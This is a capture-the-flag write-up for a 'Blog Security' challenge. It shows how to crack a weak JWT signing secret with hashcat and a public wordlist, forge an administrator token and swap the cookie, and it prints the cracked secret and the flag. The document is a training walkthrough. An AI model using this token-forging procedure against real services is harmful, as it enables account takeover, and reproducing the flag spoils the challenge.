# Blog Security CTF Challenge

**Challenge:** Blog Security  
**Points:** 650  
**URL:** <https://mnbvcxzasdfgh-csc26.cybersecuritychallenge.al>  
**Flag:** `CSC26{bl0g_s3cur1ty_fl4w}`

## Vulnerability

The application had **two critical vulnerabilities**:

1. **Weak JWT Secret** – The JWT tokens were signed with a weak secret found in common wordlists
2. **Insufficient Access Control** – Forging a JWT with a different username grants access to any profile

---

## Solution Steps

### Step 1: Register & Login

1. Register a new account (e.g. `alpet123:alpet123`)
2. Log in — the app sets a `token` cookie containing a JWT
3. Copy the JWT token from your browser cookies (it starts with `eyJ...`)

### Step 2: Crack the JWT Secret

1. Download the JWT secrets wordlist:

   ```bash
   curl https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list -o jwt_secrets.txt
   ```

2. Save your JWT token into a file called `token.txt`
3. Crack it with **hashcat**:

   ```bash
   hashcat -a 0 -m 16500 token.txt jwt_secrets.txt
   ```

4. The cracked secret:

   ```
   16f237faf903a49a3e6b7a5261fc3ac4289ffb4634df4adbe07501469fd57c9c5a6b154a4fe3c5ed51fd21a31c1132d1e14a19f269b1851bb42cad005e4c26c7
   ```

### Step 3: Forge a Token for `administrator`

1. Go to [jwt.io](https://jwt.io)
2. Set the **header** to:

   ```json
   { "alg": "HS256", "typ": "JWT" }
   ```

3. Set the **payload** to:

   ```json
   { "username": "administrator", "iat": 1769776334 }
   ```

4. Paste the cracked secret into the **"Verify Signature"** field
5. Copy the generated token

### Step 4: Get the Flag

1. In your browser, open DevTools → **Application** → **Cookies**
2. Replace the `token` cookie value with the forged JWT
3. Navigate to `/profile`
4. The flag is displayed in the administrator's bio:

   ```
   Welcome, administrator!
   Bio: CSC26{bl0g_s3cur1ty_fl4w}
   ```

---

## Key Learnings

1. **Never use weak or common secrets for JWT signing** – Use cryptographically secure random secrets (at least 256 bits)
2. **Implement proper authorization** – Verify that users can only access their own resources
3. **Try multiple usernames** – The important user might be `administrator`, not just `admin`

## Flag

```
CSC26{bl0g_s3cur1ty_fl4w}
```

---

**Author:** CTF Challenge Solution  
**Date:** January 30, 2026
